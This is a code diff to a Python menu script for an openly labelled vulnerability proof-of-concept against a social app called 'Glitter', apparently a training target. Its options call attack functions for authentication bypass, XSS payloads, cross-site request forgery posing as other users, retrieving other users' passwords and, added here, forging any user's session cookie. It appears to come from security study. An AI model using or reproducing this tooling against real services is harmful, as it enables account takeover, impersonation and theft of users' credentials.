@@ -1,11 +1,12 @@
 import glitter
 
+
 def print_menu():
     """
     a function to print the vulnerabilities menu to the user
     :return: none
     """
-    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. post a video to other user's feed\n15. PASSWORD, get other user's password\n0. Exit")
+    print("GLITTER APP AND WEBSITE VULNERABILITY POC\n1. Login into any user (app only)\n2. Send Multiple Likes from Same User\n3. Send glit with different profile image\n4. Send Like with Fake Username\n5. Send Glit with Past Date\n6. Access Other User's Feed\n7. Send to Private Account\n8. Send Glit with Colored Font\n9. Send XSS Image Payload\n10. Send XSS Link Payload\n11. Send Comment with Fake Name\n12. Send Multiple Wows from Same User\n13. XSRF, send a message to yourself from any user that you want\n14. post a video to other user's feed\n15. PASSWORD, get other user's password\n16. COOKIE, get user's cookie\n0. Exit")
 
 
 def main():
@@ -18,8 +19,8 @@ def main():
             print("Exiting...")
             break
         elif choice == "1":
-            glitter.username = input("Enter username to bypass auth (for example: !@#098): ")
-            glitter.login_with_checksum_bypass(glitter.username)
+            username = input("Enter username to bypass auth (for example: !@#098): ")
+            glitter.login_with_checksum_bypass(username)
             if glitter.sock:
                 glitter.sock.close()
         elif int(choice) in range(1, 13):
@@ -58,15 +59,19 @@ def main():
                 glit_id = input("Enter the glit_id of the glit you would send a wow on it(for example: 81199): ")
                 count = int(input("Enter the amount of wows you would like to do: "))
                 glitter.send_multiple_wows(glit_id, count)
-        elif choice in range (12, 16):
+        elif int(choice) in range(12, 16):
             glitter.login_website()
             if choice == "13":
-                glitter.target_user_id = input("Enter the target's user_id you want to send a video to (for example: 22779): ")
+                glitter.target_user_id = input("Enter the target's user_id you want him to send a message to you (for example: 22779): ")
                 glitter.xsrf_send_message_to_yourself_from_another_user()
             elif choice == "14":
+                glitter.target_user_id = input("Enter the target's user_id you want to send a video to (for example: 22779): ")
                 glitter.post_video_to_another_user_feed()
             elif choice == "15":
                 glitter.get_password()
+        elif choice == "16":
+            target_username = input("Enter the target's username (for example: !@##@!")
+            print("The cookie of " + target_username + ": " + glitter.generate_cookie(target_username))
             if glitter.sock:
                 glitter.sock.close()
         else:
